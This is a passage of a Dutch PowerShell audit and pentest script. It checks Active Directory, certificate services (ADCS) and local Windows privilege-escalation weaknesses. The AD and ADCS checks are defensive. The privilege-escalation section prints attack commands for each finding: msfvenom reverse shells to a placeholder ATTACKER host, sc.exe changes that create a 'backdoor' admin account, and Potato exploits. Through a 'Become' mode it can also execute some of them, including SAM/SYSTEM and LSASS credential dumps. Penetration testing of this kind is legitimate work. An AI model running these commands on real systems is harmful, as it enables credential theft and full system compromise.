                } else {
                    Write-Pass "Alle Domain Admins zitten in Protected Users"
                }
            } else {
                Write-Fail "Protected Users groep is leeg"
            }
        } catch {
            Write-Warn "Protected Users check gefaald: $_"
        }

        # ── LAPS ─────────────────────────────────────────────────
        Write-SubSection "LAPS Deployment"

        try {
            # Check schema voor ms-Mcs-AdmPwd
            $s = New-LdapSearcher -SearchRoot "LDAP://$schemaDN" `
                -Filter "(name=ms-Mcs-AdmPwd)" `
                -Properties @("cn") `
                -TimeoutSeconds 10
            $r = $s.FindOne()
            if ($r) {
                Write-Pass "LAPS schema-extensie aanwezig"

                # Tel computers met LAPS wachtwoord
                $sTotal = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(objectClass=computer)" `
                    -Properties @("cn") `
                    -TimeoutSeconds 20 -SizeLimit 10000
                $totalResults = $sTotal.FindAll()
                $totalCount = $totalResults.Count

                $sLaps = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                    -Filter "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" `
                    -Properties @("cn") `
                    -TimeoutSeconds 20 -SizeLimit 10000
                $lapsResults = $sLaps.FindAll()
                $lapsCount = $lapsResults.Count

                $pct = if ($totalCount -gt 0) { [math]::Round(($lapsCount / $totalCount) * 100) } else { 0 }
                Write-Info "LAPS actief op $lapsCount/$totalCount computers ($pct%)"
                if ($pct -lt 80) { Write-Warn "LAPS dekking onder 80%" }

                $totalResults.Dispose()
                $lapsResults.Dispose()
            } else {
                # Check ook Windows LAPS (msLAPS-Password)
                $s2 = New-LdapSearcher -SearchRoot "LDAP://$schemaDN" `
                    -Filter "(name=msLAPS-Password)" `
                    -Properties @("cn") `
                    -TimeoutSeconds 10
                $r2 = $s2.FindOne()
                if ($r2) {
                    Write-Pass "Windows LAPS (msLAPS-Password) schema aanwezig"
                } else {
                    Write-Fail "Geen LAPS schema-extensie gevonden (legacy noch Windows LAPS)"
                }
            }
        } catch {
            Write-Warn "LAPS check gefaald: $_"
        }

        # ── AS-REP Roastable ─────────────────────────────────────
        Write-SubSection "AS-REP Roastable Accounts"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" `
                -Properties @("sAMAccountName") `
                -TimeoutSeconds 15
            $results = $s.FindAll()
            if ($results.Count -gt 0) {
                Write-Fail "$($results.Count) account(s) zonder Kerberos pre-authentication"
                foreach ($r in $results) {
                    Write-Host "         $($r.Properties['samaccountname'][0])" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen accounts zonder Kerberos pre-authentication"
            }
            $results.Dispose()
        } catch {
            Write-Warn "AS-REP Roastable check gefaald: $_"
        }

        # ── Kerberoastable ───────────────────────────────────────
        Write-SubSection "Kerberoastable Service Accounts"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" `
                -Properties @("sAMAccountName", "servicePrincipalName") `
                -TimeoutSeconds 15
            $results = $s.FindAll()
            if ($results.Count -gt 0) {
                Write-Warn "$($results.Count) user account(s) met SPN (Kerberoastable)"
                foreach ($r in $results) {
                    Write-Host "         $($r.Properties['samaccountname'][0])" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen user accounts met SPN"
            }
            $results.Dispose()
        } catch {
            Write-Warn "Kerberoastable check gefaald: $_"
        }

        # ── gMSA ─────────────────────────────────────────────────
        Write-SubSection "Group Managed Service Accounts"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(objectClass=msDS-GroupManagedServiceAccount)" `
                -Properties @("cn") `
                -TimeoutSeconds 10
            $results = $s.FindAll()
            if ($results.Count -gt 0) {
                Write-Pass "$($results.Count) gMSA('s) geconfigureerd"
            } else {
                Write-Warn "Geen gMSA's gevonden -- overweeg migratie van service accounts"
            }
            $results.Dispose()
        } catch {
            Write-Warn "gMSA check gefaald: $_"
        }

        # ── Unconstrained Delegation ─────────────────────────────
        Write-SubSection "Unconstrained Delegation"

        try {
            # UAC 524288 = TRUSTED_FOR_DELEGATION, exclude DCs (primaryGroupID 516)
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))" `
                -Properties @("sAMAccountName") `
                -TimeoutSeconds 15
            $results = $s.FindAll()
            if ($results.Count -gt 0) {
                Write-Fail "$($results.Count) niet-DC systeem/systemen met Unconstrained Delegation"
                foreach ($r in $results) {
                    Write-Host "         $($r.Properties['samaccountname'][0])" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen niet-DC systemen met Unconstrained Delegation"
            }
            $results.Dispose()
        } catch {
            Write-Warn "Unconstrained Delegation check gefaald: $_"
        }

        # ── Wachtwoorden in Description ──────────────────────────
        Write-SubSection "Wachtwoorden in Description Velden"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectCategory=person)(objectClass=user)(description=*))" `
                -Properties @("sAMAccountName", "description") `
                -TimeoutSeconds 20
            $results = $s.FindAll()
            $suspicious = @()
            foreach ($r in $results) {
                $desc = [string]$r.Properties["description"][0]
                if ($desc -match "pass|wachtw|pwd|cred|secret|ww:") {
                    $suspicious += [PSCustomObject]@{
                        User = $r.Properties["samaccountname"][0]
                        Desc = $desc
                    }
                }
            }
            if ($suspicious.Count -gt 0) {
                Write-Fail "$($suspicious.Count) account(s) met mogelijke wachtwoorden in description"
                $suspicious | Select-Object -First 10 | ForEach-Object {
                    Write-Host "         $($_.User): $($_.Desc)" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen verdachte wachtwoord-hints in description velden"
            }
            $results.Dispose()
        } catch {
            Write-Warn "Description check gefaald: $_"
        }

        # ── SIDHistory ───────────────────────────────────────────
        Write-SubSection "SIDHistory"

        try {
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectCategory=person)(objectClass=user)(sidHistory=*))" `
                -Properties @("sAMAccountName") `
                -TimeoutSeconds 20
            $results = $s.FindAll()
            if ($results.Count -gt 0) {
                Write-Warn "$($results.Count) account(s) met SIDHistory"
                foreach ($r in $results) {
                    Write-Host "         $($r.Properties['samaccountname'][0])" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen accounts met SIDHistory"
            }
            $results.Dispose()
        } catch {
            Write-Warn "SIDHistory check gefaald: $_"
        }

        # ── AdminSDHolder ACL ────────────────────────────────────
        Write-SubSection "AdminSDHolder ACL"

        try {
            $asdhEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,$baseDN")
            $acl = $asdhEntry.ObjectSecurity
            $suspiciousACEs = $acl.Access | Where-Object {
                $_.IdentityReference.Value -notmatch "S-1-5-18|Domain Admins|Enterprise Admins|Administrators|Account Operators|SELF|NT AUTHORITY" -and
                $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
            }
            if ($suspiciousACEs) {
                Write-Fail "Verdachte ACE('s) op AdminSDHolder:"
                $suspiciousACEs | ForEach-Object {
                    Write-Host "         $($_.IdentityReference): $($_.ActiveDirectoryRights)" -ForegroundColor DarkGray
                }
            } else {
                Write-Pass "Geen verdachte ACE's op AdminSDHolder"
            }
        } catch {
            Write-Warn "AdminSDHolder ACL niet controleerbaar: $_"
        }

        # ── Kerberos Encryption Types ────────────────────────────
        Write-SubSection "Kerberos Encryption Types"

        try {
            # Controleer of RC4 nog is toegestaan
            $s = New-LdapSearcher -SearchRoot "LDAP://$baseDN" `
                -Filter "(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=*))" `
                -Properties @("sAMAccountName", "msDS-SupportedEncryptionTypes") `
                -TimeoutSeconds 15 -SizeLimit 100
            $results = $s.FindAll()
            $rc4only = 0
            foreach ($r in $results) {
                $encTypes = [int]$r.Properties["msds-supportedencryptiontypes"][0]
                # Bit 4 = RC4 (0x4), geen AES bits (0x8 = AES128, 0x10 = AES256)
                if (($encTypes -band 0x4) -and -not ($encTypes -band 0x18)) {
                    $rc4only++
                }
            }
            if ($rc4only -gt 0) {
                Write-Warn "$rc4only account(s) ondersteunen alleen RC4 (geen AES)"
            } else {
                Write-Pass "Alle accounts met expliciete encryption types ondersteunen AES"
            }
            $results.Dispose()
        } catch {
            Write-Warn "Kerberos encryption check gefaald: $_"
        }

    } # einde baseDN beschikbaar
} # einde IncludeAD

# ═════════════════════════════════════════════════════════════════
# SECTIE 8: ADCS via .NET LDAP + certutil (Hfst. 11)
# ═════════════════════════════════════════════════════════════════

if ($IncludeADCS) {

    Write-Section "ADCS CHECKS via LDAP + certutil (Hfst. 11)"

    if (-not $configDN) {
        # Probeer configDN alsnog op te halen
        try {
            $rootDSE  = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $configDN = $rootDSE.Properties["configurationNamingContext"][0]
            $baseDN   = $rootDSE.Properties["defaultNamingContext"][0]
        } catch {
            Write-Fail "LDAP niet bereikbaar -- ADCS checks niet mogelijk"
        }
    }

    if ($configDN) {

        # ── ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 via certutil ────
        Write-SubSection "CA Configuratie (ESC6)"

        $caResult = Invoke-WithTimeout -Description "certutil CA ping" -TimeoutSeconds 15 -ScriptBlock {
            $caInfo = certutil -config - -ping 2>$null
            if ($caInfo) {
                $editFlags = certutil -getreg policy\EditFlags 2>$null
                [PSCustomObject]@{ Reachable=$true; Output=($editFlags -join "`n") }
            } else {
                [PSCustomObject]@{ Reachable=$false; Output="" }
            }
        }
        if ($null -ne $caResult) {
            if (-not $caResult.Reachable) {
                Write-Skip "Geen CA bereikbaar via certutil"
            } elseif ($caResult.Output -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
                Write-Fail "EDITF_ATTRIBUTESUBJECTALTNAME2 is INGESCHAKELD (ESC6!)"
            } else {
                Write-Pass "EDITF_ATTRIBUTESUBJECTALTNAME2 is niet ingeschakeld"
            }
        }

        # ── Enrollment Services ──────────────────────────────────
        Write-SubSection "Enterprise CAs"

        try {
            $s = New-LdapSearcher `
                -SearchRoot "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN" `
                -Filter "(objectClass=pKIEnrollmentService)" `
                -Properties @("cn", "dNSHostName", "certificateTemplates") `
                -TimeoutSeconds 15
            $caResults = $s.FindAll()
            if ($caResults.Count -gt 0) {
                foreach ($ca in $caResults) {
                    Write-Info "CA: $($ca.Properties['cn'][0]) op $($ca.Properties['dnshostname'][0])"
                }
            } else {
                Write-Info "Geen Enterprise CAs gevonden in AD"
            }
            $caResults.Dispose()
        } catch {
            Write-Warn "Enterprise CA enumeratie gefaald: $_"
        }

        # ── Kwetsbare Templates (ESC1) ───────────────────────────
        Write-SubSection "Certificate Templates (ESC1)"

        try {
            $s = New-LdapSearcher `
                -SearchRoot "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configDN" `
                -Filter "(objectClass=pKICertificateTemplate)" `
                -Properties @("name", "msPKI-Certificate-Name-Flag", "pKIExtendedKeyUsage", "msPKI-RA-Signature", "msPKI-Enrollment-Flag") `
                -TimeoutSeconds 20
            $results = $s.FindAll()

            $esc1 = @()
            foreach ($t in $results) {
                $nameFlag = [int]$t.Properties["mspki-certificate-name-flag"][0]
                $eku = $t.Properties["pkiextendedkeyusage"]
                $raSignature = 0
                if ($t.Properties["mspki-ra-signature"].Count -gt 0) {
                    $raSignature = [int]$t.Properties["mspki-ra-signature"][0]
                }

                # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1
                $enrolleeSupplies = ($nameFlag -band 1) -eq 1
                # Client Auth EKU = 1.3.6.1.5.5.7.3.2 of Any Purpose = 2.5.29.37.0 of geen EKU
                $dangerousEku = ($eku.Count -eq 0) -or
                                ($eku -contains "1.3.6.1.5.5.7.3.2") -or
                                ($eku -contains "2.5.29.37.0") -or
                                ($eku -contains "1.3.6.1.4.1.311.20.2.2")
                # Manager approval niet vereist
                $noApproval = ($raSignature -eq 0)

                if ($enrolleeSupplies -and $dangerousEku -and $noApproval) {
                    $esc1 += $t.Properties["name"][0]
                }
            }

            if ($esc1.Count -gt 0) {
                Write-Fail "$($esc1.Count) template(s) kwetsbaar voor ESC1 (ENROLLEE_SUPPLIES_SUBJECT + Client Auth + No Approval)"
                $esc1 | ForEach-Object { Write-Host "         $_" -ForegroundColor DarkGray }
            } else {
                Write-Pass "Geen templates kwetsbaar voor ESC1"
            }

            # ── ESC3: Enrollment Agent templates ─────────────────
            $esc3 = @()
            foreach ($t in $results) {
                $eku = $t.Properties["pkiextendedkeyusage"]
                # Certificate Request Agent = 1.3.6.1.4.1.311.20.2.1
                if ($eku -contains "1.3.6.1.4.1.311.20.2.1") {
                    $esc3 += $t.Properties["name"][0]
                }
            }
            if ($esc3.Count -gt 0) {
                Write-Warn "$($esc3.Count) template(s) met Certificate Request Agent EKU (ESC3 potentieel)"
                $esc3 | ForEach-Object { Write-Host "         $_" -ForegroundColor DarkGray }
            } else {
                Write-Pass "Geen templates met Certificate Request Agent EKU (ESC3)"
            }

            $results.Dispose()
        } catch {
            Write-Warn "Certificate template check gefaald: $_"
        }

    } # einde configDN beschikbaar
} # einde IncludeADCS

# ═════════════════════════════════════════════════════════════════
# SECTIE 9: PRIVILEGE ESCALATIE SCAN
# ═════════════════════════════════════════════════════════════════

if ($IncludePrivesc) {

    Write-Section "PRIVILEGE ESCALATIE SCAN"

    # --- Lokale Windows Privesc Checks ---
    Write-SubSection "Modifiable Service Binaries"

    # 9.1 Service binaries met schrijfrechten
    try {
        $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName -and $_.State -eq 'Running' }
        $vulnSvc = 0
        foreach ($svc in $services) {
            $binPath = $svc.PathName -replace '"', ''
            $binPath = ($binPath -split '\s+-')[0].Trim()
            if ($binPath -and (Test-Path $binPath -ErrorAction SilentlyContinue)) {
                $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
                if ($acl) {
                    $weakPerms = $acl.Access | Where-Object {
                        $_.IdentityReference -match 'BUILTIN\\Users|Everyone|Authenticated Users' -and
                        $_.FileSystemRights -match 'Write|FullControl|Modify'
                    }
                    if ($weakPerms) {
                        Write-Fail "Service '$($svc.Name)' binary is writable: $binPath"
                        Write-Host "         → copy `"$binPath`" `"$binPath.bak`"; msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o `"$binPath`"" -ForegroundColor Cyan
                        Write-Host "         → Restart-Service '$($svc.Name)' -Force   # of wacht op reboot" -ForegroundColor Cyan
                        $svcNameCopy = $svc.Name; $binPathCopy = $binPath
                        Add-BecomeExploit -Priority 3 -Type local -Description "Service binary writable: $binPath" -CommandText "copy `"$binPath`" `"$binPath.bak`"; Restart-Service '$($svc.Name)'" -Command ([scriptblock]::Create("Copy-Item '$binPathCopy' '$binPathCopy.bak'; Write-Host '[BECOME] Binary gebackupt -- vervang met payload en herstart service $svcNameCopy' -ForegroundColor Yellow"))
                        $vulnSvc++
                    }
                }
            }
        }
        if ($vulnSvc -eq 0) { Write-Pass "Geen writable service binaries gevonden" }
    } catch {
        Write-Skip "Kan service binaries niet controleren: $_"
    }

    # 9.2 Service DACLs
    Write-SubSection "Service Permissies (DACLs)"
    try {
        $weakDacl = 0
        $svcList = Get-Service -ErrorAction SilentlyContinue | Select-Object -First $ServiceDACLLimit
        foreach ($svc in $svcList) {
            $sdOut = sc.exe sdshow $svc.Name 2>$null
            if ($sdOut -and $sdOut -match '\(A;;[^;]*?(CC|DC|GA|RPWPCR|WP)[^;]*?;;;(BU|WD|AU)\)') {
                Write-Fail "Service '$($svc.Name)' heeft weak DACL"
                Write-Host "         → sc.exe config $($svc.Name) binpath= `"cmd /c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add`"" -ForegroundColor Cyan
                Write-Host "         → sc.exe start $($svc.Name)   # service draait als SYSTEM" -ForegroundColor Cyan
                $svcN = $svc.Name
                Add-BecomeExploit -Priority 4 -Type local -Description "Weak DACL: $svcN" -CommandText "sc.exe config $svcN binpath= `"cmd /c whoami`" && sc.exe start $svcN" -Command ([scriptblock]::Create("sc.exe config '$svcN' binpath= 'cmd /c whoami'; sc.exe start '$svcN'"))
                $weakDacl++
            }
        }
        if ($weakDacl -eq 0) { Write-Pass "Geen services met weak DACLs" }
    } catch {
        Write-Skip "Kan service DACLs niet controleren: $_"
    }

    # 9.3 Scheduled tasks met writable pad
    Write-SubSection "Scheduled Tasks"
    try {
        $taskCsv = schtasks.exe /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
        $vulnTask = 0
        foreach ($task in $taskCsv) {
            $taskAction = $task.'Task To Run'
            if ($taskAction -and $taskAction -ne 'N/A') {
                $taskPath = ($taskAction -replace '"', '' -split '\s')[0]
                if ($taskPath -and (Test-Path $taskPath -ErrorAction SilentlyContinue)) {
                    $acl = Get-Acl $taskPath -ErrorAction SilentlyContinue
                    if ($acl) {
                        $weakPerms = $acl.Access | Where-Object {
                            $_.IdentityReference -match 'BUILTIN\\Users|Everyone|Authenticated Users' -and
                            $_.FileSystemRights -match 'Write|FullControl|Modify'
                        }
                        if ($weakPerms) {
                            Write-Fail "Scheduled task writable: $taskPath"
                            Write-Host "         → copy `"$taskPath`" `"$taskPath.bak`"; <payload>.exe → `"$taskPath`"" -ForegroundColor Cyan
                            Write-Host "         → schtasks /query /fo LIST /v /tn `"$($task.TaskName)`"   # check timing" -ForegroundColor Cyan
                            $tpCopy = $taskPath
                            Add-BecomeExploit -Priority 5 -Type local -Description "Scheduled task writable: $taskPath" -CommandText "copy `"$taskPath`" `"$taskPath.bak`"; <payload> → $taskPath" -Command ([scriptblock]::Create("Copy-Item '$tpCopy' '$tpCopy.bak'; Write-Host '[BECOME] Task binary gebackupt -- vervang met payload' -ForegroundColor Yellow"))
                            $vulnTask++
                        }
                    }
                }
            }
        }
        if ($vulnTask -eq 0) { Write-Pass "Geen writable scheduled task binaries" }
    } catch {
        Write-Skip "Kan scheduled tasks niet controleren: $_"
    }

    # 9.4 Autorun registry
    Write-SubSection "Autorun Registry"
    try {
        $autorunKeys = @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
        )
        $vulnAutorun = 0
        foreach ($key in $autorunKeys) {
            if (Test-Path $key -ErrorAction SilentlyContinue) {
                $entries = Get-ItemProperty $key -ErrorAction SilentlyContinue
                foreach ($prop in $entries.PSObject.Properties) {
                    if ($prop.Name -match '^PS') { continue }
                    $exePath = ($prop.Value -replace '"', '' -split '\s')[0]
                    if ($exePath -and (Test-Path $exePath -ErrorAction SilentlyContinue)) {
                        $acl = Get-Acl $exePath -ErrorAction SilentlyContinue
                        if ($acl) {
                            $weakPerms = $acl.Access | Where-Object {
                                $_.IdentityReference -match 'BUILTIN\\Users|Everyone|Authenticated Users' -and
                                $_.FileSystemRights -match 'Write|FullControl|Modify'
                            }
                            if ($weakPerms) {
                                Write-Fail "Autorun writable: $exePath"
                                Write-Host "         → copy `"$exePath`" `"$exePath.bak`"; <payload>.exe → `"$exePath`"   # triggert bij volgende login" -ForegroundColor Cyan
                                $epCopy = $exePath
                                Add-BecomeExploit -Priority 7 -Type local -Description "Autorun writable: $exePath" -CommandText "copy `"$exePath`" `"$exePath.bak`"; <payload> → $exePath" -Command ([scriptblock]::Create("Copy-Item '$epCopy' '$epCopy.bak'; Write-Host '[BECOME] Autorun binary gebackupt -- vervang met payload' -ForegroundColor Yellow"))
                                $vulnAutorun++
                            }
                        }
                    }
                }
            }
        }
        if ($vulnAutorun -eq 0) { Write-Pass "Geen writable autorun binaries" }
    } catch {
        Write-Skip "Kan autorun niet controleren: $_"
    }

    # 9.5 Stored credentials
    Write-SubSection "Opgeslagen Credentials"
    try {
        $creds = cmdkey.exe /list 2>$null
        $credEntries = ($creds | Select-String 'Target:').Count
        if ($credEntries -gt 0) {
            Write-Warn "Opgeslagen credentials ($credEntries):"
            $creds | Select-String 'Target:' | ForEach-Object { Write-Host "    $_" }
        } else {
            Write-Pass "Geen opgeslagen credentials"
        }
    } catch {
        Write-Skip "Kan credentials niet controleren: $_"
    }

    # 9.6 Writable Program Files
    Write-SubSection "Program Files Permissies"
    try {
        $weakProg = 0
        foreach ($dir in @("$env:ProgramFiles", "${env:ProgramFiles(x86)}")) {
            if ($dir -and (Test-Path $dir)) {
                $acl = Get-Acl $dir -ErrorAction SilentlyContinue
                $weakPerms = $acl.Access | Where-Object {
                    $_.IdentityReference -match 'BUILTIN\\Users|Everyone' -and
                    $_.FileSystemRights -match 'Write|FullControl|Modify'
                }
                if ($weakPerms) {
                    Write-Fail "Writable: $dir"
                    Write-Host "         → DLL plant: copy payload.dll `"$dir\<app>\<missing>.dll`"   # gebruik Procmon om missing DLLs te vinden" -ForegroundColor Cyan
                    $weakProg++
                }
            }
        }
        if ($weakProg -eq 0) { Write-Pass "Program Files correct beveiligd" }
    } catch {
        Write-Skip "Kan Program Files niet controleren: $_"
    }

    # 9.7 Uitgebreide Token Privileges
    Write-SubSection "Gevaarlijke Token Privileges"
    try {
        $dangerousPrivs = @(
            'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege',
            'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege',
            'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege',
            'SeTcbPrivilege', 'SeCreateTokenPrivilege'
        )
        $currentPrivs = whoami.exe /priv 2>$null
        $privFound = 0
        foreach ($priv in $dangerousPrivs) {
            if ($currentPrivs -match $priv) {
                $enabled = if ($currentPrivs -match "$priv\s+.*Enabled") { " (ENABLED)" } else { " (Disabled)" }
                Write-Fail "Gevaarlijk privilege: $priv$enabled"
                switch ($priv) {
                    'SeImpersonatePrivilege'         { Write-Host "         → .\GodPotato.exe -cmd `"cmd /c whoami`"   # of JuicyPotato/PrintSpoofer/SweetPotato" -ForegroundColor Cyan
                        Add-BecomeExploit -Priority 1 -Type local -Description "Potato: SeImpersonate" -CommandText ".\GodPotato.exe -cmd `"cmd /c whoami`"" -Command { Write-Host "[BECOME] Voer uit: .\GodPotato.exe -cmd 'cmd /c whoami'" -ForegroundColor Yellow } }
                    'SeAssignPrimaryTokenPrivilege'   { Write-Host "         → .\GodPotato.exe -cmd `"cmd /c whoami`"   # zelfde potato-familie" -ForegroundColor Cyan
                        Add-BecomeExploit -Priority 1 -Type local -Description "Potato: SeAssignPrimaryToken" -CommandText ".\GodPotato.exe -cmd `"cmd /c whoami`"" -Command { Write-Host "[BECOME] Voer uit: .\GodPotato.exe -cmd 'cmd /c whoami'" -ForegroundColor Yellow } }
                    'SeBackupPrivilege'               { Write-Host "         → reg save HKLM\SAM C:\temp\sam & reg save HKLM\SYSTEM C:\temp\system   # dump met secretsdump.py" -ForegroundColor Cyan
                        Add-BecomeExploit -Priority 2 -Type local -Description "SeBackup: SAM/SYSTEM dump" -CommandText "reg save HKLM\SAM C:\temp\sam & reg save HKLM\SYSTEM C:\temp\system" -Command { reg save HKLM\SAM C:\temp\sam; reg save HKLM\SYSTEM C:\temp\system; Write-Host "[BECOME] SAM en SYSTEM gedumpt naar C:\temp\" -ForegroundColor Green } }
                    'SeRestorePrivilege'              { Write-Host "         → Write naar protected files/registry: robocopy /B of reg load + edit" -ForegroundColor Cyan }
                    'SeDebugPrivilege'                { Write-Host "         → rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full   # dump LSASS" -ForegroundColor Cyan
                        Add-BecomeExploit -Priority 2 -Type local -Description "SeDebug: LSASS minidump" -CommandText "rundll32.exe comsvcs.dll, MiniDump lsass.Id C:\temp\lsass.dmp full" -Command { $lsassId = (Get-Process lsass).Id; rundll32.exe comsvcs.dll MiniDump $lsassId C:\temp\lsass.dmp full; Write-Host "[BECOME] LSASS gedumpt naar C:\temp\lsass.dmp" -ForegroundColor Green } }
                    'SeTakeOwnershipPrivilege'        { Write-Host "         → takeown /f C:\Windows\System32\config\SAM & icacls ... /grant %username%:F" -ForegroundColor Cyan }
                    'SeLoadDriverPrivilege'           { Write-Host "         → Load kwetsbare driver (Capcom.sys) → kernel exploit → SYSTEM" -ForegroundColor Cyan }
                    'SeTcbPrivilege'                  { Write-Host "         → Act as OS: token manipulatie mogelijk → impersonate SYSTEM" -ForegroundColor Cyan }
                    'SeCreateTokenPrivilege'          { Write-Host "         → NtCreateToken() → maak token met willekeurige privileges" -ForegroundColor Cyan }
                }
                $privFound++
            }
        }
        if ($privFound -eq 0) { Write-Pass "Geen gevaarlijke token privileges" }
    } catch {
        Write-Skip "Kan privileges niet controleren: $_"
    }

    # 9.8 Named Pipes
    Write-SubSection "Named Pipes"
    try {
        $pipes = [System.IO.Directory]::GetFiles('\\.\pipe\') 2>$null
        $exploitablePipes = @('spoolss', 'efsrpc', 'lsarpc', 'samr', 'netlogon', 'browser')
        $pipeFound = 0
        foreach ($epipe in $exploitablePipes) {
            $match = $pipes | Where-Object { $_ -like "*$epipe*" }
            if ($match) {
                Write-Info "Pipe: $($match -join ', ')"
                $pipeFound++
            }
        }
        if ($pipeFound -eq 0) { Write-Pass "Geen bekende exploiteerbare pipes" }
    } catch {
        Write-Skip "Kan pipes niet controleren: $_"
    }

    # 9.9 GPP Passwords (via .NET DirectoryEntry)
    Write-SubSection "GPP Passwords"
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name 2>$null
        if ($domain) {
            $sysvolPath = "\\$domain\SYSVOL"
            if (Test-Path $sysvolPath -ErrorAction SilentlyContinue) {
                $gppFound = $false
                Get-ChildItem -Path $sysvolPath -Recurse -Include '*.xml' -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = [System.IO.File]::ReadAllText($_.FullName)
                    if ($content -match 'cpassword') {
                        Write-Fail "GPP Password in: $($_.FullName)"
                        Write-Host "         → type `"$($_.FullName)`" | findstr cpassword   # kopieer de cpassword waarde" -ForegroundColor Cyan
                        Write-Host "         → gpp-decrypt <cpassword>   # of: python3 -c `"import base64; from Crypto.Cipher import AES; ...`"" -ForegroundColor Cyan
                        $gppFound = $true
                    }
                }
                if (-not $gppFound) { Write-Pass "Geen GPP passwords in SYSVOL" }
            } else {
                Write-Info "SYSVOL niet bereikbaar"
            }
        } else {
            Write-Info "Geen domein - GPP check overgeslagen"
        }
    } catch {
        Write-Skip "Kan GPP niet controleren: $_"
    }

    # 9.10 DLL Hijack PATH
    Write-SubSection "DLL Hijack via PATH"
    try {
        $pathDirs = $env:PATH -split ';'
        $writablePath = 0
        foreach ($dir in $pathDirs) {
            if ($dir -and (Test-Path $dir -ErrorAction SilentlyContinue)) {
                $acl = Get-Acl $dir -ErrorAction SilentlyContinue
                $weakPerms = $acl.Access | Where-Object {
                    $_.IdentityReference -match 'BUILTIN\\Users|Everyone|Authenticated Users' -and
                    $_.FileSystemRights -match 'Write|FullControl|Modify'
                }
                if ($weakPerms) {
                    Write-Fail "Writable PATH dir: $dir"
                    Write-Host "         → DLL hijack: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o `"$dir\<target>.dll`"" -ForegroundColor Cyan
                    Write-Host "         → Vind targets: Procmon → Path contains `"$dir`" AND Result is NAME NOT FOUND AND Path ends with .dll" -ForegroundColor Cyan
                    if ($Become) {
                        $dirCopy = $dir
                        Add-BecomeExploit -Priority 10 -Type local -Description "DLL Hijack writable PATH: $dir" `
                            -CommandText "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o `"$dirCopy\target.dll`"" `
                            -Command ([scriptblock]::Create("Write-Host '[BECOME] Genereer DLL payload naar $dirCopy -- pas LHOST/target.dll aan' -ForegroundColor Yellow"))
                    }
                    $writablePath++
                }
            }
        }
        if ($writablePath -eq 0) { Write-Pass "Geen writable directories in PATH" }
    } catch {
        Write-Skip "Kan PATH niet controleren: $_"
    }

    # 9.11 Print Spooler / PrintNightmare
    Write-SubSection "Print Spooler"
    try {
        $spooler = Get-Service -Name 'Spooler' -ErrorAction SilentlyContinue
        if ($spooler -and $spooler.Status -eq 'Running') {
            Write-Warn "Print Spooler actief - potentieel PrintNightmare kwetsbaar"
            # Primaire check: OS build number (betrouwbaarder dan KB lookup)
            $osVer = [System.Environment]::OSVersion.Version
            $buildPatched = $false
            if ($osVer.Build -ge 22000) {
                # Windows 11 / Server 2022+ -- alle builds bevatten de fix
                $buildPatched = $true
            } elseif ($osVer.Build -ge 19041 -and $osVer.Build -le 19044 -and $osVer.Revision -ge 1165) {
                # Windows 10 2004/20H2/21H1/21H2 met patch (build revision >= 1165)
                $buildPatched = $true
            }
            # Secundaire check: recente hotfix na augustus 2021
            if (-not $buildPatched) {
                $recentHotfix = Get-HotFix -ErrorAction SilentlyContinue |
                    Where-Object { $_.InstalledOn -gt [datetime]'2021-08-01' } |
                    Select-Object -First 1
                if ($recentHotfix) { $buildPatched = $true }
            }
            # Fallback: oorspronkelijke KB check
            if (-not $buildPatched) {
                $patches = Get-HotFix -Id 'KB5005010','KB5005565','KB5005568' -ErrorAction SilentlyContinue
                if ($patches) { $buildPatched = $true }
            }
            if ($buildPatched) {
                Write-Info "PrintNightmare patch aanwezig (OS build $($osVer.Build).$($osVer.Revision))"
            } else {
